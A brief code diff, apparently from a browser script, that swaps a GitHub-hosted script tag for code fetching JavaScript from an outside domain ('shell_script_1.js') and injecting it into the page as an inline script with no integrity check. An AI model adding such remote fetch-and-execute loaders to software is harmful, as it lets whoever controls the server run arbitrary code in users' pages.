@@ -1,3 +1,8 @@
-let script = document.createElement('script');
-script.src = 'https://raw.githubusercontent.com/solitarysp/google_shell_tool/main/js/add.js';
-document.body.appendChild(script)
+
+fetch('https://angular.gwweb.xyz/all_asset/shell_script_1.js')
+.then((response) => response.text())
+.then((data) => {
+  let script = document.createElement('script');
+  script.textContent  = data;
+  document.body.appendChild(script);
+});
